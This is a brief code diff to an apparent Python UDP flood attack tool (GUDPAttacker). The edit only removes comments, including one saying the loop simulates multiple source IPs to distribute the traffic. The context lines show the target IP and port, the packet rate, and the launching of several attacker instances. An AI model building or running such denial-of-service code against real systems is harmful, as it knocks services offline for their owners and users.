@@ -10,8 +10,8 @@ class GUDPAttacker:
         self.target_ip = target_ip
         self.target_port = target_port
         self.num_packets = num_packets
-        self.rate = rate  # packets per second
-        self.timeout = timeout  # in seconds
+        self.rate = rate 
+        self.timeout = timeout 
         self.packet_size = packet_size
 
         self.packets_sent = 0
@@ -111,7 +111,6 @@ class GUDPAttackScript:
             print("Attack aborted.")
             return
 
-        # Simulate multiple source IPs for traffic distribution
         for _ in range(args.traffic_distribution):
             attacker = GUDPAttacker(args.target_ip, args.target_port, args.num_packets, args.rate, args.timeout, args.packet_size)
             attacker.run_attack(args.verbose)
